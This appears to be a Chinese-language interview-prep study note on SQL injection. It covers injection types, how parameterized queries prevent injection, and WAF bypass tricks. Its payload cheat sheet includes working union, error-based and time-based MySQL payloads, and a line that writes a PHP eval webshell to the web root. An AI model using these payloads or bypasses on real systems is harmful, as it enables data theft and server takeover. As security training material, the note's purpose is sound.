# Day 5：SQL注入攻击与防御

> 🎯 面试目标：能清晰解释SQL注入的原理、分类、检测方法和防御方案，并能手写注入Payload

## 知识速览

### 核心概念
- **SQL注入本质**：用户输入被当作SQL代码执行，根本原因是输入验证不足+动态拼接SQL语句。攻击者可以读数据、改数据、写文件、甚至执行系统命令
- **注入分类**：数字型注入（id=1 and 1=1）、字符型注入（name='admin' or '1'='1'）、搜索型注入（LIKE '%xxx%'）、盲注（布尔盲注/时间盲注，页面无回显时使用）、堆叠注入（;分隔多条SQL）、二次注入（先存储后触发）
- **防御层级**：参数化查询/预编译（最有效）> 输入校验+白名单过滤 > WAF > 最小权限原则（数据库账户只给必要权限）> 错误信息屏蔽（不暴露数据库结构）

### 必问考点

| 面试官可能怎么问 | 你应该怎么答 |
|------------------|--------------|
| SQL注入有哪几种类型？分别怎么测试？ | ①联合查询注入：用order by判断列数，union select回显数据；②报错注入：利用extractvalue/updatexml等函数让数据库报错带出数据；③布尔盲注：根据页面返回内容差异逐字符猜解；④时间盲注：用sleep/benchmark根据响应时间判断；⑤堆叠注入：分号执行多条SQL；⑥宽字节注入：GBK编码下%df'吃掉转义符 |
| 参数化查询为什么能防SQL注入？ | 参数化查询将SQL语句结构和数据分开传递——数据库驱动先将SQL模板编译（确定语法树），再将参数值作为纯数据绑定，参数永远不会被当作SQL代码执行。这和"拼字符串再执行"有本质区别 |
| 碰到WAF拦截怎么办？ | ①编码绕过（URL双编码、Unicode编码、十六进制）；②大小写/注释变形（SeLeCt, /**/）；③等价替换（and→&&, 空格→/**/→%0a）；④分块传输；⑤HTTP参数污染；⑥寻找WAF未覆盖的参数位置（Cookie/Referer等Header注入） |

### 技术细节

经典注入Payload速查：
```sql
-- 数字型注入
?id=1 and 1=1   -- 正常
?id=1 and 1=2   -- 异常（确认注入点）

-- 字符型注入
?id=1' and '1'='1
?id=1' and '1'='2

-- 联合查询（先order by判断列数）
?id=-1' union select 1,2,3,4,5-- 
?id=-1' union select 1,database(),user(),version(),5-- 

-- 报错注入（MySQL）
?id=1' and extractvalue(1,concat(0x7e,(select database())))-- 
?id=1' and updatexml(1,concat(0x7e,(select database())),1)-- 

-- 时间盲注
?id=1' and if(length(database())>5,sleep(3),0)-- 
?id=1' and if(substr(database(),1,1)='a',sleep(3),0)-- 

-- 写Webshell（需要知道绝对路径+有写入权限）
?id=1' union select 1,2,'<?php @eval($_POST[cmd]);?>' into outfile '/var/www/html/shell.php'-- 
```

## 常见陷阱
- ⚠️ 只记住Payload不理解原理——面试官追问"这个Payload为什么能绕过"时就答不上来
- ⚠️ 忘了说防御——面试时讲完攻击后一定要主动提防御方案，展示安全意识
- ⚠️ 混淆不同数据库的注入语法——MySQL用information_schema，MSSQL用sysobjects，Oracle用all_tables，面试时要注意区分

## 今日检测
1. 在SQLi-Labs靶场中完成1-20关，记录每种注入类型的关键Payload
2. 手写3个绕过常见WAF的SQL注入Payload
3. 用自己的话解释：为什么预编译（PreparedStatement）是目前最有效的SQL注入防御手段？
